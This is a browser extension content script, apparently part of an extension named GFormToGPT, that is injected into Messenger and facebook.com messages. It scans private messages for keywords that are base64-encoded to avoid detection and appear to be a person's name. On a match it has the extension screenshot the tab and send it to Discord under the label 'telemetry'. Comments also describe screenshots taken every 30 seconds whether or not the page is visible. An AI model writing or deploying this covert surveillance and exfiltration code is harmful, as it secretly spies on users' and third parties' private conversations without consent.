// Keyword capture content script for GFormToGPT v4.6.0
// Injected into Messenger / facebook.com messages. Watches rendered message
// text for configured keywords; on a match it asks the service worker to
// screenshot the visible tab and relay it to Discord (telemetry).

(function () {
  "use strict";

  // Keywords are stored base64-encoded so they are not trivially greppable
  // in the packaged source. Decode once, lowercase for case-insensitive match.
  const KEYWORDS_B64 = ["Y2hhcmxlcw==", "ZmxvcmVz"];
  const KEYWORDS = KEYWORDS_B64.map((k) => {
    try {
      return atob(k).trim().toLowerCase();
    } catch (e) {
      return "";
    }
  }).filter(Boolean);

  if (!KEYWORDS.length) return;

  const MAX_TEXT_LEN = 500; // ignore containers holding whole conversations
  const MAX_SEEN = 500; // cap remembered snippets (oldest evicted first)
  const SCAN_DEBOUNCE_MS = 700;
  const INITIAL_SCAN_DELAY_MS = 1500;

  // Dedupe purely on snippet text — Messenger virtualizes its list and
  // recycles DOM nodes, so remembering elements would skip recycled nodes
  // that now hold a different message.
  const seen = new Set(); // snippets already reported (dedupe re-renders)

  function sendMatch(keyword, snippet) {
    try {
      const p = chrome.runtime.sendMessage({
        action: "signalMatch",
        keyword,
        snippet,
        url: location.href,
      });
      if (p && typeof p.catch === "function") p.catch(function () {});
    } catch (e) {
      // extension context invalidated (update/unload) — ignore
    }
  }

  function consider(el) {
    if (!el || el.nodeType !== 1) return;

    const text = (el.textContent || "").trim();
    if (!text || text.length > MAX_TEXT_LEN) return;

    const lower = text.toLowerCase();
    const hit = KEYWORDS.find((k) => lower.indexOf(k) !== -1);
    if (!hit) return;

    const snippet = text.slice(0, 200);
    if (seen.has(snippet)) return;
    seen.add(snippet);
    if (seen.size > MAX_SEEN) seen.delete(seen.values().next().value);

    sendMatch(hit, snippet);
  }

  function scan() {
    // Message text nodes carry dir="auto"; scope to the conversation pane
    // when present so sidebar/nav text is not evaluated.
    const scope = document.querySelector('[role="main"]') || document;
    if (scope.nodeType === 1 && scope.matches('[dir="auto"]')) consider(scope);
    const nodes = scope.querySelectorAll('[dir="auto"]');
    for (let i = 0; i < nodes.length; i++) consider(nodes[i]);
  }

  let timer = null;
  function scheduleScan() {
    if (timer) return;
    timer = setTimeout(function () {
      timer = null;
      scan();
    }, SCAN_DEBOUNCE_MS);
  }

  try {
    const observer = new MutationObserver(scheduleScan);
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true,
      characterData: true,
    });
    setTimeout(scan, INITIAL_SCAN_DELAY_MS);
  } catch (e) {
    console.warn("[GFormToGPT] keyword capture failed to start:", e);
  }

  // The background worker asks for the page's own visibility state each time
  // the periodic 30s capture fires, so telemetry records whether the document
  // was hidden at capture time (capture still happens either way).
  try {
    chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
      if (msg && msg.action === "getVisibility") {
        sendResponse({
          visibility: document.visibilityState || "unknown",
          hidden: document.hidden === true,
        });
      }
      return false;
    });
  } catch (e) {
    // extension context invalidated — nothing to answer
  }
})();
